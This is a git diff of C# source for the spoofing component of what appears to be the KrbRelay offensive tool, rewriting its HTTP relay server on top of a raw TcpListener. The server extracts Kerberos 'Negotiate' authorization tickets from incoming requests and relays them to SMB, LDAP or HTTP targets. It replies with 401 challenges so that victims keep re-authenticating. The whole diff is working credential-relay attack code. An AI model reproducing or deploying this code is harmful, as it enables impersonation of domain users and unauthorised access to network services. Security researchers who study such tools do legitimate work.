@@ -7,95 +7,91 @@ using System.Net.Http;
 using System.Collections.Generic;
 using System.Linq;
 using System.Runtime.InteropServices;
+using System.Net.Sockets;
+using System.Text.RegularExpressions;
 
 namespace KrbRelay.Spoofing
 {
-    internal class HttpRelayServer
+    public interface IHttpServer
     {
-        //server
-        public static HttpListener listener;
-        public static string url = "";
-        public static string service;
-        public static int requestCount = 0;
-        public static string pageData =
-            "<!DOCTYPE>" +
-            "<html>" +
-            "  <head>" +
-            "    <title>Hello World</title>" +
-            "  </head>" +
-            "</html>";
+        void Start();
+    }
+    public class HttpServer : IHttpServer
+    {
+        private readonly TcpListener listener;
+        private readonly string service;
 
-
-        //todo: replace httpListener with tcpListener
-
-        public static void start(string Service, string argSpooferIP)
+        public HttpServer(string ip, int port, string service)
         {
-            service = Service;
-            url = "http://"+argSpooferIP+"/";
-
-            //server
-            listener = new HttpListener();
-            listener.Prefixes.Add(url);
-            listener.Start();
-            Console.WriteLine("[*] Listening for connections on {0}", url);
-
-            // Handle requests
-            Task listenTask = HandleIncomingConnections();
-            listenTask.GetAwaiter().GetResult();
+            this.listener = new TcpListener(IPAddress.Parse(ip), port);
+            this.service = service;
         }
 
-        public static async Task HandleIncomingConnections()
+        public void Start()
         {
+            this.listener.Start();
             while (true)
             {
-                // Will wait here until we hear from a connection
-                HttpListenerContext ctx = await listener.GetContextAsync();
+                var client = this.listener.AcceptTcpClient();
+                var buffer = new byte[10240];
+                var stream = client.GetStream();
+                var length = stream.Read(buffer, 0, buffer.Length);
+                var result = "Access denied";
+                var incomingMessage = Encoding.UTF8.GetString(buffer, 0, length);
+                Console.WriteLine("Incoming message: {0}", incomingMessage);
+                var myMatch = Regex.Matches(incomingMessage, "Authorization: Negotiate .*");
 
-                // Peel out the requests and response objects
-                HttpListenerRequest req = ctx.Request;
-                HttpListenerResponse resp = ctx.Response;
+                //relay 
                 string ticket = "";
-
-                // Print out some info about the request
-                Console.WriteLine("[*] New Request #: {0}", ++requestCount);
-                Console.WriteLine("Requested hostname: {0}", req.Url.ToString());
-                Console.WriteLine("UserAgent: {0}", req.UserAgent);
-                if (req.Headers.AllKeys.Contains("Authorization"))
+                string targetResp = "";
+                if (myMatch.Count > 0)
                 {
-                    ticket = req.Headers.GetValues("Authorization")[0];
-                    Console.WriteLine(ticket);
+                    ticket = myMatch[0].Value.Replace("Authorization: ","");
+                    //Console.WriteLine(ticket);
                 }
                 Console.WriteLine();
-
-                string targetResp = "";
+                
                 if (service == "http")
-                    targetResp = httpConnect(ticket);
-                else if (!string.IsNullOrEmpty(ticket)){
+                    targetResp = HttpRelayServer.httpConnect(ticket);
+                else if (!string.IsNullOrEmpty(ticket))
+                {
                     if (service == "cifs")
-                        targetResp = smbConnect(ticket);
+                        targetResp = HttpRelayServer.smbConnect(ticket);
                     else if (service == "ldap")
-                        targetResp = ldapConnect(ticket);
+                        targetResp = HttpRelayServer.ldapConnect(ticket);
                 }
-                else {
+                else
+                {
                     targetResp = "Negotiate";
                     //targetResp = "Kerberos";
                 }
 
-                // Write the response info
-                byte[] data = Encoding.UTF8.GetBytes("Access denied");
-                resp.ContentType = "text/html";
-                resp.ContentEncoding = Encoding.UTF8;
-                resp.ContentLength64 = data.LongLength;
-                resp.AddHeader("WWW-Authenticate", targetResp);
-                resp.StatusCode = (int)HttpStatusCode.Unauthorized;
-
-
-                // Write out to the response stream (asynchronously), then close it
-                await resp.OutputStream.WriteAsync(data, 0, data.Length);
-                resp.Close();
+                //string status = "HTTP/1.0 200 OK";
+                string status = "HTTP/1.1 401 Unauthorized";
+                byte[] msg = Encoding.UTF8.GetBytes(
+                        status + Environment.NewLine
+                        + "Content-Length: " + result.Length + Environment.NewLine
+                        + "Content-Type: " + "text/html" + Environment.NewLine
+                        + "WWW-Authenticate: " + targetResp + Environment.NewLine
+                        + Environment.NewLine
+                        + result
+                        + Environment.NewLine + Environment.NewLine);
+                stream.Write(msg, 0, msg.Length);
+                    
             }
         }
+    }
 
+    internal class HttpRelayServer
+    {
+
+
+        public static void start(string Service, string argSpooferIP)
+        {
+            Console.WriteLine("[*] Listening for connections on http://{0}:80", argSpooferIP);
+            IHttpServer server = new HttpServer(argSpooferIP, 80, Service);
+            server.Start();
+        }
 
         //clients
         public static string ldapConnect(string ticket)
